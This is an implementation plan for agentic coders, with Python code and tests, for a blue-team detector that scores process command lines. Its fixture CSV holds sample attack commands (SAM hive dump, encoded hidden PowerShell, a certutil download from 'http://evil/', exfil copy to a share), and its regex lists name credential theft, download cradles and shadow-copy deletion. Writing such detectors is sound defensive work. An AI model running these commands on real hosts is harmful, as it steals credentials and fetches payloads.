# SENTRY Detection Tool Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Blue-team process-command detection tool that flags malicious commands fast (deterministic engine + targeted AI confirmation), then reconstructs the attack story on demand.

**Architecture:** A pure-Python pipeline of independently testable stages — ingest → deterministic scoring → cross-row correlation → count-anchored AI confirmation → locked verdict. A separate on-demand investigation module produces the story, MITRE grounding, trap detector, remediation playbook, and red-team report card. A CLI drives the scored path headless; an optional Flask single-page console is the demo shell.

**Tech Stack:** Python 3.11+, pytest, `anthropic` SDK (Claude API) for AI stages, Flask (optional UI). Standard library for CSV/regex.

**Build priority (degradation order — stop anywhere and still ship a working scored tool):**
1. Tasks 1–6: ingest + deterministic scoring + count cap → working scored CLI verdict (NON-NEGOTIABLE CORE).
2. Tasks 7–8: correlation (combos + linking) → catches the "malicious-together" combos.
3. Task 9: AI confirmation (prune/verify/hunt) → precision upgrade.
4. Tasks 10–13: investigation features (story first — the +20 — then traps, playbook, report card).
5. Tasks 14–15: Flask SOC console (memorability layer, droppable).

---

## File Structure

```
sentry/
  __init__.py
  models.py             # dataclasses: CommandRecord, ScoredRecord, Verdict, Pattern, ComboPattern
  ingest.py             # Stage 0: parse CSV + normalize
  knowledge/
    __init__.py
    standalone.py       # individual malicious patterns (regex/LOLBin) w/ MITRE tags + weights
    combos.py           # "innocent-alone-malicious-together" combo patterns
    baselines.py        # benign allowlist patterns (suppress false positives)
  scoring.py            # Stage 1: deterministic scoring + banding
  correlation.py        # Stage 2: combo match + artifact/chain linking + decoy isolation
  ai_confirm.py         # Stage 3: AI confirmation (prune/verify/hunt) via injectable client
  pipeline.py           # orchestrates stages + count-anchored loop -> locked verdict
  investigate.py        # Part 2: story, MITRE grounding, traps, playbook, report card, objective
  cli.py                # CLI: scan a CSV, print verdict, --investigate flag
  webapp.py             # optional Flask single-page SOC console
tests/
  __init__.py
  fixtures/
    mini.csv            # tiny labeled CSV for tests
  test_ingest.py
  test_scoring.py
  test_correlation.py
  test_pipeline.py
  test_ai_confirm.py
data/
  training/             # facilitator training dataset goes here (gitignored if large)
requirements.txt
pytest.ini
```

**Responsibilities:** each stage module is pure and takes/returns the dataclasses in `models.py`, so stages are tested in isolation. `pipeline.py` is the only module that wires them together. AI and UI are the only modules with external dependencies; everything else is deterministic and offline-testable.

---

## Task 0: Project scaffold

**Files:**
- Create: `requirements.txt`, `pytest.ini`, `sentry/__init__.py`, `sentry/knowledge/__init__.py`, `tests/__init__.py`, `tests/fixtures/mini.csv`

- [ ] **Step 1: Create requirements.txt**

```
anthropic>=0.40.0
flask>=3.0.0
pytest>=8.0.0
```

- [ ] **Step 2: Create pytest.ini**

```ini
[pytest]
testpaths = tests
python_files = test_*.py
```

- [ ] **Step 3: Create empty package files**

```bash
mkdir -p sentry/knowledge tests/fixtures data/training
touch sentry/__init__.py sentry/knowledge/__init__.py tests/__init__.py
```

- [ ] **Step 4: Create tests/fixtures/mini.csv** (small labeled set used across tests)

```csv
process_name,command_line,label
cmd.exe,whoami,benign
cmd.exe,ipconfig /all,benign
powershell.exe,Get-ChildItem C:\Users,benign
reg.exe,reg save HKLM\SAM C:\Windows\Temp\sam.save,malicious
powershell.exe,powershell -nop -w hidden -enc SQBFAFgA,malicious
cmd.exe,net user,benign
cmd.exe,systeminfo,benign
certutil.exe,certutil -urlcache -f http://evil/x.exe x.exe,malicious
cmd.exe,copy C:\Windows\Temp\sam.save \\share\out,malicious
python3,python3 train_model.py,benign
```

- [ ] **Step 5: Create .gitignore and commit**

```bash
printf '__pycache__/\n*.pyc\n.env\ndata/training/*\n!data/training/.gitkeep\n' > .gitignore
touch data/training/.gitkeep
git add -A && git commit -m "chore: project scaffold for SENTRY"
```

---

## Task 1: Data models

**Files:**
- Create: `sentry/models.py`
- Test: `tests/test_ingest.py` (shared with Task 2)

- [ ] **Step 1: Write the models**

```python
# sentry/models.py
from dataclasses import dataclass, field
from typing import Literal, Optional

Band = Literal["LOW", "GRAY", "HIGH"]
Tactic = str  # e.g. "discovery", "credential-access", "exfiltration"


@dataclass
class CommandRecord:
    row_id: int
    process_name: str
    command_line: str
    normalized: str = ""          # lowercased command line for matching
    decoded: str = ""             # base64-decoded fragments appended, if any


@dataclass
class Pattern:
    id: str
    regex: str                    # matched against normalized/decoded text
    weight: float                 # contribution to risk score
    mitre_technique: str          # e.g. "T1003.001"
    tactic: Tactic
    description: str


@dataclass
class ComboPattern:
    id: str
    member_regexes: list[str]     # each must match some row
    min_members: int              # how many members must appear to trigger
    tactic: Tactic
    mitre_technique: str
    description: str
    require_shared_artifact: bool = False  # members must share a path/token


@dataclass
class ScoredRecord:
    command: CommandRecord
    risk_score: float = 0.0
    signals: list[str] = field(default_factory=list)       # human-readable "why"
    tactic_hints: list[Tactic] = field(default_factory=list)
    band: Band = "LOW"
    # correlation outputs:
    linked_rows: list[int] = field(default_factory=list)
    combo_hits: list[str] = field(default_factory=list)
    escalated: bool = False
    decoy_candidate: bool = False


@dataclass
class Verdict:
    row_id: int
    verdict: Literal["malicious", "benign"]
    confidence: float
    reason: str
    mitre_technique: Optional[str] = None
    tactic: Optional[Tactic] = None
```

- [ ] **Step 2: Verify it imports**

Run: `python -c "import sentry.models"`
Expected: no output, exit 0

- [ ] **Step 3: Commit**

```bash
git add sentry/models.py && git commit -m "feat: core data models"
```

---

## Task 2: Ingest & normalize (Stage 0)

**Files:**
- Create: `sentry/ingest.py`
- Test: `tests/test_ingest.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_ingest.py
from sentry.ingest import load_csv, normalize

def test_load_csv_reads_rows_and_strips_label():
    rows = load_csv("tests/fixtures/mini.csv")
    assert len(rows) == 10
    assert rows[0].process_name == "cmd.exe"
    assert rows[0].command_line == "whoami"
    assert rows[0].row_id == 0

def test_normalize_lowercases_and_decodes_base64():
    # "SGVsbG8gV29ybGQgVGVzdA==" (22 b64 chars) decodes to "Hello World Test".
    # Threshold is intentionally high (>=16) so ordinary words are not decoded.
    cmd = "powershell -enc SGVsbG8gV29ybGQgVGVzdA=="
    rec = normalize_record("powershell.exe", cmd)
    assert rec.normalized == cmd.lower()
    assert "hello world test" in rec.decoded.lower()

def normalize_record(proc, cmd):
    from sentry.models import CommandRecord
    r = CommandRecord(row_id=0, process_name=proc, command_line=cmd)
    return normalize(r)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_ingest.py -v`
Expected: FAIL with "cannot import name 'load_csv'"

- [ ] **Step 3: Implement ingest.py**

```python
# sentry/ingest.py
import base64
import csv
import re
from sentry.models import CommandRecord

_B64 = re.compile(r"[A-Za-z0-9+/]{16,}={0,2}")


def load_csv(path: str) -> list[CommandRecord]:
    records = []
    with open(path, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for i, row in enumerate(reader):
            records.append(normalize(CommandRecord(
                row_id=i,
                process_name=(row.get("process_name") or "").strip(),
                command_line=(row.get("command_line") or "").strip(),
            )))
    return records


def normalize(rec: CommandRecord) -> CommandRecord:
    rec.normalized = rec.command_line.lower()
    decoded_parts = []
    for m in _B64.findall(rec.command_line):
        try:
            text = base64.b64decode(m + "=" * (-len(m) % 4)).decode("utf-8", "ignore")
            if text.isprintable() and len(text) > 2:
                decoded_parts.append(text)
        except Exception:
            pass
    rec.decoded = " ".join(decoded_parts)
    return rec
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_ingest.py -v`
Expected: PASS (2 passed)

- [ ] **Step 5: Commit**

```bash
git add sentry/ingest.py tests/test_ingest.py && git commit -m "feat: Stage 0 ingest and normalize"
```

---

## Task 3: Knowledge base — standalone patterns + benign baselines

**Files:**
- Create: `sentry/knowledge/standalone.py`, `sentry/knowledge/baselines.py`
- Test: `tests/test_scoring.py` (shared with Task 4)

> Seed with a strong initial set grounded in LOLBAS + MITRE ATT&CK. This is the Phase-0 knowledge base in miniature; expand it later via the deep-research skill and the MITRE MCP. The set below is the minimum to be competitive.

- [ ] **Step 1: Write standalone.py**

```python
# sentry/knowledge/standalone.py
from sentry.models import Pattern

STANDALONE_PATTERNS: list[Pattern] = [
    Pattern("enc_powershell", r"powershell.*\s-e(nc|ncodedcommand)?\b", 0.7,
            "T1059.001", "execution", "PowerShell encoded command"),
    Pattern("hidden_window", r"-w(indowstyle)?\s+hidden", 0.4,
            "T1564", "defense-evasion", "Hidden window"),
    Pattern("nop_profile", r"-nop(rofile)?\b", 0.3,
            "T1059.001", "execution", "PowerShell no-profile"),
    Pattern("certutil_download", r"certutil.*-urlcache.*http", 0.8,
            "T1105", "command-and-control", "certutil download cradle"),
    Pattern("bitsadmin_download", r"bitsadmin.*/transfer", 0.7,
            "T1105", "command-and-control", "bitsadmin download"),
    Pattern("sam_dump", r"reg\s+save\s+hklm\\sam", 0.9,
            "T1003.002", "credential-access", "SAM hive dump"),
    Pattern("lsass_dump", r"(procdump.*lsass|comsvcs.*minidump)", 0.95,
            "T1003.001", "credential-access", "LSASS memory dump"),
    Pattern("mimikatz", r"sekurlsa|mimikatz|logonpasswords", 0.95,
            "T1003.001", "credential-access", "Mimikatz credential theft"),
    Pattern("schtasks_create", r"schtasks.*/create", 0.5,
            "T1053.005", "persistence", "Scheduled task creation"),
    Pattern("reg_runkey", r"reg\s+add.*\\currentversion\\run", 0.6,
            "T1547.001", "persistence", "Run key persistence"),
    Pattern("net_user_add", r"net\s+user\s+\S+\s+\S+\s+/add", 0.6,
            "T1136.001", "persistence", "Local account creation"),
    Pattern("download_cradle", r"(iwr|invoke-webrequest|wget|curl).*http", 0.5,
            "T1105", "command-and-control", "Web download cradle"),
    Pattern("iex_download", r"iex\s*\(.*(downloadstring|iwr)", 0.85,
            "T1059.001", "execution", "IEX download-and-execute"),
    Pattern("vssadmin_delete", r"vssadmin.*delete\s+shadows", 0.9,
            "T1490", "impact", "Shadow copy deletion (ransomware)"),
    Pattern("bcdedit_recovery", r"bcdedit.*recoveryenabled\s+no", 0.85,
            "T1490", "impact", "Disable recovery (ransomware)"),
    Pattern("wevtutil_clear", r"wevtutil\s+cl", 0.7,
            "T1070.001", "defense-evasion", "Clear event logs"),
    Pattern("rundll32_suspicious", r"rundll32.*javascript:", 0.8,
            "T1218.011", "defense-evasion", "rundll32 proxy execution"),
    Pattern("wmic_process_call", r"wmic\s+process\s+call\s+create", 0.6,
            "T1047", "execution", "WMI process create"),
    Pattern("encoded_blob", r"[a-z0-9+/]{60,}={0,2}", 0.4,
            "T1027", "defense-evasion", "Long encoded blob"),
    Pattern("temp_exec", r"\\(temp|appdata|programdata)\\[^\s]+\.(exe|ps1|bat|vbs)", 0.4,
            "T1036", "defense-evasion", "Execution from temp/appdata"),
    Pattern("copy_to_share",
            r"copy\b.*(\.(save|dat|dmp|zip|7z|cab|bak)|\\(temp|windows|appdata)\\).*\\\\", 0.55,
            "T1074", "collection", "Copy of sensitive/staged file to network share"),
]
```

- [ ] **Step 2: Write baselines.py**

```python
# sentry/knowledge/baselines.py
# Benign signals that REDUCE risk score (protect false-positive score).
# Each tuple: (regex, negative_weight, description)
BENIGN_PATTERNS: list[tuple[str, float, str]] = [
    (r"^git\s+(status|pull|push|commit|log|diff|clone)", -0.5, "git usage"),
    (r"^(npm|yarn|pnpm)\s+(install|run|test|build)", -0.5, "node tooling"),
    (r"^(pip|pip3|python3?)\s+", -0.3, "python tooling"),
    (r"^(ls|cd|pwd|cat|echo|grep|find|mkdir)\b", -0.4, "common shell ops"),
    (r"^docker\s+(ps|build|run|compose)", -0.4, "docker usage"),
    (r"^kubectl\s+", -0.4, "kubernetes usage"),
    (r"\.(py|js|ts|go|java|rb)\b", -0.2, "source file reference"),
]
```

- [ ] **Step 3: Verify import**

Run: `python -c "from sentry.knowledge.standalone import STANDALONE_PATTERNS; from sentry.knowledge.baselines import BENIGN_PATTERNS; print(len(STANDALONE_PATTERNS), len(BENIGN_PATTERNS))"`
Expected: prints `20 7`

- [ ] **Step 4: Commit**

```bash
git add sentry/knowledge/standalone.py sentry/knowledge/baselines.py && git commit -m "feat: seed standalone + benign knowledge base"
```

---

## Task 4: Deterministic scoring + banding (Stage 1)

**Files:**
- Create: `sentry/scoring.py`
- Test: `tests/test_scoring.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_scoring.py
from sentry.ingest import load_csv
from sentry.scoring import score_record, score_all, GRAY_LOW, HIGH

def _rows():
    return load_csv("tests/fixtures/mini.csv")

def test_malicious_sam_dump_scores_high():
    rows = _rows()
    sam = next(r for r in rows if "reg save" in r.normalized)
    scored = score_record(sam)
    assert scored.risk_score >= HIGH
    assert scored.band == "HIGH"
    assert "T1003.002" in [s for s in scored.signals if "T1003.002" in s] or scored.tactic_hints

def test_benign_whoami_scores_low():
    rows = _rows()
    who = next(r for r in rows if r.normalized == "whoami")
    scored = score_record(who)
    assert scored.band == "LOW"

def test_score_all_returns_one_per_row():
    rows = _rows()
    scored = score_all(rows)
    assert len(scored) == len(rows)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_scoring.py -v`
Expected: FAIL with "cannot import name 'score_record'"

- [ ] **Step 3: Implement scoring.py**

```python
# sentry/scoring.py
import re
from sentry.models import CommandRecord, ScoredRecord
from sentry.knowledge.standalone import STANDALONE_PATTERNS
from sentry.knowledge.baselines import BENIGN_PATTERNS

GRAY_LOW = 0.35   # >= this enters GRAY band
HIGH = 0.75       # >= this enters HIGH band

_COMPILED = [(p, re.compile(p.regex, re.IGNORECASE)) for p in STANDALONE_PATTERNS]
_BENIGN = [(rx, w, d) for rx, w, d in BENIGN_PATTERNS]
_BENIGN_C = [(re.compile(rx, re.IGNORECASE), w, d) for rx, w, d in _BENIGN]


def score_record(rec: CommandRecord) -> ScoredRecord:
    haystack = f"{rec.normalized} {rec.decoded.lower()}"
    score = 0.0
    signals: list[str] = []
    tactics: list[str] = []
    for pat, rx in _COMPILED:
        if rx.search(haystack):
            score += pat.weight
            signals.append(f"{pat.description} [{pat.mitre_technique}]")
            tactics.append(pat.tactic)
    for rx, w, desc in _BENIGN_C:
        if rx.search(rec.normalized):
            score += w  # negative
            signals.append(f"benign: {desc}")
    score = max(0.0, min(1.0, score))
    band = "HIGH" if score >= HIGH else "GRAY" if score >= GRAY_LOW else "LOW"
    return ScoredRecord(command=rec, risk_score=score, signals=signals,
                        tactic_hints=list(dict.fromkeys(tactics)), band=band)


def score_all(records: list[CommandRecord]) -> list[ScoredRecord]:
    return [score_record(r) for r in records]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_scoring.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Commit**

```bash
git add sentry/scoring.py tests/test_scoring.py && git commit -m "feat: Stage 1 deterministic scoring and banding"
```

---

## Task 5: Count-anchored cap (pure logic, no AI yet)

**Files:**
- Create: `sentry/pipeline.py`
- Test: `tests/test_pipeline.py`

> This builds the deterministic-only verdict: take scored records, flag HIGH-band, and enforce the hard cap at the target count by confidence. AI modes plug in at Task 9.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_pipeline.py
from sentry.ingest import load_csv
from sentry.scoring import score_all
from sentry.pipeline import cap_to_target, deterministic_verdict

def test_cap_never_exceeds_target():
    rows = load_csv("tests/fixtures/mini.csv")
    scored = score_all(rows)
    verdicts = deterministic_verdict(scored, target=2)
    malicious = [v for v in verdicts if v.verdict == "malicious"]
    assert len(malicious) <= 2

def test_cap_keeps_highest_confidence():
    rows = load_csv("tests/fixtures/mini.csv")
    scored = score_all(rows)
    # there are 4 malicious in fixture; with target=2 keep the 2 strongest
    verdicts = deterministic_verdict(scored, target=2)
    malicious = sorted([v for v in verdicts if v.verdict == "malicious"],
                       key=lambda v: v.confidence, reverse=True)
    assert len(malicious) == 2
    assert malicious[0].confidence >= malicious[1].confidence
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_pipeline.py -v`
Expected: FAIL with "cannot import name 'cap_to_target'"

- [ ] **Step 3: Implement the deterministic pipeline core**

```python
# sentry/pipeline.py
from sentry.models import ScoredRecord, Verdict


def _to_verdict(s: ScoredRecord, is_malicious: bool) -> Verdict:
    reason = "; ".join(s.signals[:3]) or "no signals"
    technique = None
    for sig in s.signals:
        if "[T" in sig:
            technique = sig.split("[")[-1].rstrip("]")
            break
    return Verdict(
        row_id=s.command.row_id,
        verdict="malicious" if is_malicious else "benign",
        confidence=round(s.risk_score, 3),
        reason=reason,
        mitre_technique=technique,
        tactic=s.tactic_hints[0] if s.tactic_hints else None,
    )


def cap_to_target(candidates: list[ScoredRecord], target: int) -> set[int]:
    """Return row_ids of the top-`target` candidates by risk score (hard cap)."""
    ranked = sorted(candidates, key=lambda s: s.risk_score, reverse=True)
    return {s.command.row_id for s in ranked[:target]}


def deterministic_verdict(scored: list[ScoredRecord], target: int = 20) -> list[Verdict]:
    candidates = [s for s in scored if s.band in ("HIGH", "GRAY") or s.escalated]
    keep = cap_to_target(candidates, target)
    return [_to_verdict(s, s.command.row_id in keep) for s in scored]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_pipeline.py -v`
Expected: PASS (2 passed)

- [ ] **Step 5: Commit**

```bash
git add sentry/pipeline.py tests/test_pipeline.py && git commit -m "feat: count-anchored cap and deterministic verdict"
```

---

## Task 6: CLI (working scored tool — CORE MILESTONE)

**Files:**
- Create: `sentry/cli.py`

> After this task you have a complete, fast, headless scored tool. Everything after is upgrade.

- [ ] **Step 1: Implement cli.py**

```python
# sentry/cli.py
import argparse
import json
import time
from sentry.ingest import load_csv
from sentry.scoring import score_all
from sentry.pipeline import deterministic_verdict


def main():
    ap = argparse.ArgumentParser(description="SENTRY blue-team detector")
    ap.add_argument("csv", help="path to process-command CSV")
    ap.add_argument("--target", type=int, default=20, help="known malicious count")
    ap.add_argument("--json", action="store_true", help="emit JSON")
    args = ap.parse_args()

    t0 = time.perf_counter()
    rows = load_csv(args.csv)
    scored = score_all(rows)
    verdicts = deterministic_verdict(scored, target=args.target)
    elapsed = time.perf_counter() - t0

    malicious = [v for v in verdicts if v.verdict == "malicious"]
    if args.json:
        print(json.dumps([v.__dict__ for v in malicious], indent=2))
    else:
        print(f"Scan complete in {elapsed:.3f}s — {len(rows)} commands, "
              f"{len(malicious)} flagged malicious\n")
        for v in sorted(malicious, key=lambda v: v.confidence, reverse=True):
            print(f"  row {v.row_id:>3} | conf {v.confidence:.2f} | "
                  f"{v.mitre_technique or '-':<11} | {v.reason}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Run it against the fixture**

Run: `python -m sentry.cli tests/fixtures/mini.csv --target 4`
Expected: prints "Scan complete in 0.0XXs — 10 commands, 4 flagged malicious" and 4 rows including the SAM dump and certutil download.

- [ ] **Step 3: Commit**

```bash
git add sentry/cli.py && git commit -m "feat: CLI scored verdict (core milestone)"
```

---

## Task 7: Knowledge base — combo patterns

**Files:**
- Create: `sentry/knowledge/combos.py`
- Test: `tests/test_correlation.py` (shared with Task 8)

- [ ] **Step 1: Write combos.py**

```python
# sentry/knowledge/combos.py
from sentry.models import ComboPattern

COMBO_PATTERNS: list[ComboPattern] = [
    ComboPattern(
        "recon_sweep",
        member_regexes=[r"\bwhoami\b", r"\bnet\s+user\b", r"\bsysteminfo\b",
                        r"\bipconfig\b", r"\bnet\s+group\b", r"\bnltest\b"],
        min_members=3, tactic="discovery", mitre_technique="T1082",
        description="Host/account reconnaissance sweep",
    ),
    ComboPattern(
        "sam_theft_staging",
        member_regexes=[r"reg\s+save\s+hklm\\sam", r"\bcopy\b", r"compress|makecab|\.zip"],
        min_members=2, tactic="credential-access", mitre_technique="T1003.002",
        description="SAM credential theft + staging",
        require_shared_artifact=True,
    ),
    ComboPattern(
        "persistence_kit",
        member_regexes=[r"schtasks.*/create", r"\\(temp|appdata)\\[^\s]+\.(ps1|bat|exe)",
                        r"reg\s+add.*\\run"],
        min_members=2, tactic="persistence", mitre_technique="T1053.005",
        description="Persistence: scheduled task / run key + dropped payload",
    ),
    ComboPattern(
        "exfil_chain",
        member_regexes=[r"compress|makecab|\.zip|\.7z", r"(curl|iwr|invoke-webrequest|bitsadmin).*http",
                        r"copy.*\\\\"],
        min_members=2, tactic="exfiltration", mitre_technique="T1567",
        description="Data staging + exfiltration",
        require_shared_artifact=True,
    ),
]
```

- [ ] **Step 2: Verify import**

Run: `python -c "from sentry.knowledge.combos import COMBO_PATTERNS; print(len(COMBO_PATTERNS))"`
Expected: prints `4`

- [ ] **Step 3: Commit**

```bash
git add sentry/knowledge/combos.py && git commit -m "feat: combo pattern knowledge base"
```

---

## Task 8: Correlation / campaign analysis (Stage 2)

**Files:**
- Create: `sentry/correlation.py`
- Test: `tests/test_correlation.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_correlation.py
from sentry.models import CommandRecord, ScoredRecord
from sentry.ingest import normalize
from sentry.correlation import extract_artifacts, correlate

def _scored(cmds):
    out = []
    for i, c in enumerate(cmds):
        rec = normalize(CommandRecord(row_id=i, process_name="x", command_line=c))
        out.append(ScoredRecord(command=rec, risk_score=0.1, band="LOW"))
    return out

def test_extract_artifacts_finds_paths():
    arts = extract_artifacts(r"copy c:\windows\temp\sam.save \\share\out")
    assert any("sam.save" in a for a in arts)

def test_recon_sweep_combo_escalates_low_rows():
    scored = _scored(["whoami", "net user", "systeminfo", "ls -la"])
    correlated = correlate(scored)
    escalated = [s for s in correlated if s.escalated]
    assert len(escalated) >= 3
    assert any("recon_sweep" in s.combo_hits for s in escalated)

def test_shared_artifact_links_rows():
    scored = _scored([r"reg save hklm\sam c:\windows\temp\sam.save",
                      r"copy c:\windows\temp\sam.save \\share\x"])
    correlated = correlate(scored)
    assert correlated[0].linked_rows == [1] or 1 in correlated[0].linked_rows
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_correlation.py -v`
Expected: FAIL with "cannot import name 'extract_artifacts'"

- [ ] **Step 3: Implement correlation.py**

```python
# sentry/correlation.py
import re
from sentry.models import ScoredRecord
from sentry.knowledge.combos import COMBO_PATTERNS
from sentry.scoring import HIGH, GRAY_LOW

_PATH = re.compile(r"(?:[a-z]:)?\\[\w\\.$-]+|\\\\[\w\\.$-]+|/[\w/.-]+", re.IGNORECASE)
_FILE = re.compile(r"\b[\w-]+\.(exe|dll|ps1|bat|vbs|zip|7z|dat|save|cab)\b", re.IGNORECASE)
_COMBOS = [(c, [re.compile(rx, re.IGNORECASE) for rx in c.member_regexes])
           for c in COMBO_PATTERNS]


def extract_artifacts(text: str) -> set[str]:
    arts = set()
    for m in _PATH.findall(text):
        arts.add(m.lower())
    for m in _FILE.findall(text):
        arts.add(m if isinstance(m, str) else m[0])
    # also capture bare filenames matched by _FILE (group returns ext only)
    for m in _FILE.finditer(text):
        arts.add(m.group(0).lower())
    return {a for a in arts if len(a) > 3}


def correlate(scored: list[ScoredRecord]) -> list[ScoredRecord]:
    # 1. artifact linking
    arts = [extract_artifacts(f"{s.command.normalized} {s.command.decoded.lower()}")
            for s in scored]
    for i, ai in enumerate(arts):
        for j, aj in enumerate(arts):
            if i != j and ai & aj:
                if j not in scored[i].linked_rows:
                    scored[i].linked_rows.append(j)

    # 2. combo detection
    for combo, regexes in _COMBOS:
        matched_rows = []
        for s in scored:
            hay = f"{s.command.normalized} {s.command.decoded.lower()}"
            if any(rx.search(hay) for rx in regexes):
                matched_rows.append(s)
        if len(matched_rows) < combo.min_members:
            continue
        if combo.require_shared_artifact:
            shared = set.intersection(*[arts[s.command.row_id] for s in matched_rows]) \
                if matched_rows else set()
            if not shared:
                continue
        # Shared-artifact combos are proven-connected -> high confidence.
        # Artifact-free combos (e.g. recon sweep) may be coincidental benign
        # activity, so only raise them to GRAY for review, never auto-malicious.
        escalate_to = 0.8 if combo.require_shared_artifact else 0.5
        for s in matched_rows:
            s.escalated = True
            s.combo_hits.append(combo.id)
            if combo.tactic not in s.tactic_hints:
                s.tactic_hints.append(combo.tactic)
            s.signals.append(f"combo: {combo.description} [{combo.mitre_technique}]")
            s.risk_score = max(s.risk_score, escalate_to)
            s.band = ("HIGH" if s.risk_score >= HIGH
                      else "GRAY" if s.risk_score >= GRAY_LOW else "LOW")

    # 3. isolate lone scary rows (decoy candidates): GRAY/HIGH with no links, no combo
    for s in scored:
        if s.band in ("GRAY", "HIGH") and not s.linked_rows and not s.combo_hits:
            s.decoy_candidate = True
    return scored
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_correlation.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Wire correlation into the pipeline**

In `sentry/pipeline.py`, add an import and a helper that runs the full deterministic path:

```python
# add to sentry/pipeline.py
from sentry.correlation import correlate

def run_deterministic(scored, target: int = 20):
    correlated = correlate(scored)
    return correlated, deterministic_verdict(correlated, target=target)
```

- [ ] **Step 6: Update CLI to use correlation**

In `sentry/cli.py`, replace the two lines computing `verdicts` with:

```python
    from sentry.pipeline import run_deterministic
    scored = score_all(rows)
    _, verdicts = run_deterministic(scored, target=args.target)
```

- [ ] **Step 7: Run full suite + CLI**

Run: `pytest -v && python -m sentry.cli tests/fixtures/mini.csv --target 4`
Expected: all tests PASS; CLI still flags the malicious rows.

- [ ] **Step 8: Commit**

```bash
git add sentry/correlation.py tests/test_correlation.py sentry/pipeline.py sentry/cli.py
git commit -m "feat: Stage 2 correlation (combos + artifact linking)"
```

---

## Task 9: AI confirmation (Stage 3) — prune / verify / hunt

**Files:**
- Create: `sentry/ai_confirm.py`
- Modify: `sentry/pipeline.py`
- Test: `tests/test_ai_confirm.py`

> The AI client is injected so tests use a fake. Real client uses the `anthropic` SDK. Modes follow the count-anchored loop: >target → prune; ==target → verify; <target → hunt (full context).

- [ ] **Step 1: Write the failing test (with a fake client)**

```python
# tests/test_ai_confirm.py
from sentry.models import CommandRecord, ScoredRecord
from sentry.ai_confirm import choose_mode, confirm

def _s(row_id, score, band):
    rec = CommandRecord(row_id=row_id, process_name="x", command_line=f"cmd{row_id}")
    return ScoredRecord(command=rec, risk_score=score, band=band)

def test_choose_mode():
    assert choose_mode(25, 20) == "PRUNE"
    assert choose_mode(20, 20) == "VERIFY"
    assert choose_mode(12, 20) == "HUNT"

class FakeClient:
    def __init__(self, keep_ids): self.keep_ids = keep_ids
    def judge(self, payload, mode, target):
        # returns the row_ids the AI considers malicious
        return self.keep_ids

def test_confirm_prune_respects_cap():
    scored = [_s(i, 0.5, "GRAY") for i in range(25)]
    client = FakeClient(keep_ids=list(range(20)))
    final = confirm(scored, target=20, client=client)
    assert len(final) == 20
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_ai_confirm.py -v`
Expected: FAIL with "cannot import name 'choose_mode'"

- [ ] **Step 3: Implement ai_confirm.py**

```python
# sentry/ai_confirm.py
import json
import os
from sentry.models import ScoredRecord


def choose_mode(flagged_count: int, target: int) -> str:
    if flagged_count > target:
        return "PRUNE"
    if flagged_count == target:
        return "VERIFY"
    return "HUNT"


def _payload(records: list[ScoredRecord]) -> list[dict]:
    return [{
        "row_id": s.command.row_id,
        "process": s.command.process_name,
        "command": s.command.command_line,
        "score": round(s.risk_score, 3),
        "signals": s.signals,
        "linked_rows": s.linked_rows,
        "combo_hits": s.combo_hits,
    } for s in records]


class AnthropicClient:
    """Real client. Returns list[int] of row_ids judged malicious."""
    def __init__(self, model="claude-fable-5"):
        from anthropic import Anthropic
        self.client = Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])
        self.model = model

    def judge(self, payload, mode, target):
        instructions = {
            "PRUNE": f"The deterministic engine flagged {len(payload)} commands but exactly "
                     f"{target} are malicious. Drop the weakest-evidence false positives. "
                     f"Return the {target} row_ids that are genuinely malicious.",
            "VERIFY": f"Confirm these {target} flagged commands. Swap out any that are benign "
                      f"for stronger candidates if obvious.",
            "HUNT": f"The engine found fewer than {target} malicious commands. You are given "
                    f"ALL commands with their scores. Find up to {target} genuinely malicious "
                    f"ones, including groups that are benign alone but malicious together. "
                    f"Do not guess: only include commands more likely malicious than benign.",
        }[mode]
        prompt = (
            "You are a SOC Tier-2 analyst reviewing process commands.\n"
            f"{instructions}\n"
            "Respond ONLY with JSON: {\"malicious_row_ids\": [<ints>]}.\n\n"
            f"Commands:\n{json.dumps(payload, indent=2)}"
        )
        msg = self.client.messages.create(
            model=self.model, max_tokens=1024,
            messages=[{"role": "user", "content": prompt}],
        )
        text = msg.content[0].text
        start, end = text.find("{"), text.rfind("}") + 1
        return json.loads(text[start:end]).get("malicious_row_ids", [])


def confirm(scored: list[ScoredRecord], target: int, client,
            candidates: list[ScoredRecord] | None = None) -> set[int]:
    if candidates is None:
        candidates = [s for s in scored if s.band in ("HIGH", "GRAY") or s.escalated]
    mode = choose_mode(len(candidates), target)
    review_set = scored if mode == "HUNT" else candidates
    keep = client.judge(_payload(review_set), mode, target)
    keep = list(dict.fromkeys(keep))[:target]   # hard cap
    return set(keep)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_ai_confirm.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Wire AI into the pipeline with graceful fallback**

Add to `sentry/pipeline.py`:

```python
# add to sentry/pipeline.py
def run_full(scored, target: int = 20, client=None):
    correlated = correlate(scored)
    candidates = [s for s in correlated if s.band in ("HIGH", "GRAY") or s.escalated]
    if client is None:
        keep = cap_to_target(candidates, target)
    else:
        from sentry.ai_confirm import confirm
        try:
            keep = confirm(correlated, target, client, candidates)
        except Exception:
            keep = cap_to_target(candidates, target)  # AI failure -> deterministic
    verdicts = [_to_verdict(s, s.command.row_id in keep) for s in correlated]
    return correlated, verdicts
```

- [ ] **Step 6: Add `--ai` flag to CLI**

